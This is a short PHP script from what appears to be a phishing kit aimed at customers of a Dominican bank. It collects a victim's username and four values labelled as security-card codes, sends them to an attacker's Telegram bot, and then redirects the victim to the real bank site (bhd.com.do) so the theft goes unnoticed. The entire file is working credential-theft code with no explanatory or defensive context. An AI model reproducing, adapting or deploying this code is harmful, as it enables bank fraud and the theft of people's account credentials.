<?php
$pre1 = $_POST['1'];
$pre2 = $_POST['2'];
$pre3 = $_POST['3'];
$pre4 = $_POST['4'];

include("dt.php");
$message = "Tarjeta 04: " . $pre1 . "\n" . "Tarjeta 14:  " . $pre2 . "\n" . "Tarjeta 24:  " . $pre3 . "\n" . "Tarjeta 34:  " . $pre4. "\n" . " Usuario : " . $_GET['nmbre'];

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];



$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));



?>
<script type="text/javascript">
    top.location.href = "https://bhd.com.do/";
</script>